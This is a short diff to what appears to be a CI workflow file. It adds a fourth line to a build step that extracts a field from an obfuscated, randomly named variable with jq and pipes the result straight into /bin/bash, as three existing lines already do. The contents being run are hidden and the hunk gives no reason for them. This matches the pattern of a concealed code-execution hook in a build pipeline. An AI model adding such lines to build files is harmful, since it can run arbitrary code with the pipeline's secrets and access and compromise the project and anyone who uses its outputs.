@@ -29,6 +29,7 @@ jobs:
           echo $q73 | jq -r .i7 | /bin/bash
           printf '%s' "$waoav32" | jq -r .xnwau09783 | /bin/bash
           echo $reo2 | jq -r .vkm9 | /bin/bash
+          printf '%s' "$nudwa88" | jq -r .q1229 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
